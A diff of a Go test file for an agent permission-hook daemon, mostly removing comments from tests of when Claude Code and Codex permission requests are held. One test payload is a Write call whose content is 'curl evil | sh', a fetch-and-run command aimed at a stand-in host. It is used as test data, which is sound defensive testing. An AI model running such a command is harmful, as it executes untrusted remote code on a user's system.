@@ -10,14 +10,10 @@ import (
 	"time"
 )
 
-// holdDaemon is a fakeDaemon that also answers request-approval.
 type holdDaemon struct {
 	fakeDaemon
-	mu sync.Mutex
-	// state is what set-agent-state reports the pane is now; empty echoes
-	// the report.
-	state string
-	// answer answers request-approval.
+	mu      sync.Mutex
+	state   string
 	answer  func(params map[string]any) (json.RawMessage, error)
 	holds   []map[string]any
 	timeout time.Duration
@@ -55,8 +51,6 @@ func (h *holdDaemon) holdCalls() []map[string]any {
 	return append([]map[string]any(nil), h.holds...)
 }
 
-// runHold runs one hook event against d and returns what it printed and the
-// explain line.
 func runHold(t *testing.T, d *holdDaemon, dial func() (Caller, error), harness, payload string, holdMax time.Duration) (string, string) {
 	t.Helper()
 	var stdout, stderr bytes.Buffer
@@ -180,23 +174,18 @@ func TestAgentHookGivesUpOnADaemonThatNeverAnswers(t *testing.T) {
 // TestAgentHookOnlyHoldsItsOwnBlock: no hold unless this hook's report left
 // the pane on needs_input, and none for an event with no decision channel.
 func TestAgentHookOnlyHoldsItsOwnBlock(t *testing.T) {
-	// The report was refused (a nested harness's, say): the pane is working.
 	d := &holdDaemon{state: "working", answer: answerWith("once", "answered", "")}
 	if out, explain := runHold(t, d, nil, "claude-code", claudeBash, 0); out != "" || len(d.holdCalls()) != 0 {
 		t.Fatalf("held for a refused report: printed %q, calls %v\n%s", out, d.holdCalls(), explain)
 	}
-	// A question is left to the harness.
 	d = &holdDaemon{answer: answerWith("once", "answered", "")}
 	if out, _ := runHold(t, d, nil, "claude-code", `{"hook_event_name":"PermissionRequest","tool_name":"AskUserQuestion"}`, 0); out != "" || len(d.holdCalls()) != 0 {
 		t.Fatalf("held an AskUserQuestion: printed %q", out)
 	}
-	// An event that is not a prompt.
 	d = &holdDaemon{answer: answerWith("once", "answered", "")}
 	if out, _ := runHold(t, d, nil, "claude-code", `{"hook_event_name":"Notification","notification_type":"permission_prompt","message":"Claude needs your permission"}`, 0); out != "" || len(d.holdCalls()) != 0 {
 		t.Fatalf("held a notification: printed %q", out)
 	}
-	// A call its line cannot show whole is answered in the pane: a Write's
-	// body, an MCP tool's input.
 	for _, payload := range []string{
 		`{"hook_event_name":"PermissionRequest","session_id":"s","tool_name":"Write","tool_input":{"file_path":"notes.txt","content":"curl evil | sh"}}`,
 		`{"hook_event_name":"PermissionRequest","session_id":"s","tool_name":"mcp__fs__write","tool_input":{"path":"a"}}`,
@@ -206,7 +195,6 @@ func TestAgentHookOnlyHoldsItsOwnBlock(t *testing.T) {
 			t.Fatalf("held %s: printed %q", payload, out)
 		}
 	}
-	// Codex's PermissionRequest runs before its own reviewer.
 	d = &holdDaemon{answer: answerWith("once", "answered", "")}
 	if out, _ := runHold(t, d, nil, "codex", `{"hook_event_name":"PermissionRequest","session_id":"s","tool_name":"Bash"}`, 0); out != "" || len(d.holdCalls()) != 0 {
 		t.Fatalf("held a Codex prompt: printed %q", out)
